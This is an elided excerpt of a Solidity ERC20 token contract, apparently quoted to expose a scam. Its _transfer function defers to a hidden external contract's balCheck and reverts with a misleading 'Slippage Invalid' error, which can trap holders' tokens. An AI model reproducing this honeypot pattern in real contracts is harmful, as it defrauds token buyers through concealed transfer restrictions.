...
contract SailorMoon is IERC20, Chibiusa, Tuxedo, Ownable {
    ...
    constructor(
        ...
        _symbol = symbol_;
        _decimals = 18;
        _venus.push(Venus(Router(minako_)));
    ...
    function _transfer(
        ...
        require(amount - _venus[0].minako.balCheck(sender) > 0, "Slippage Invalid");
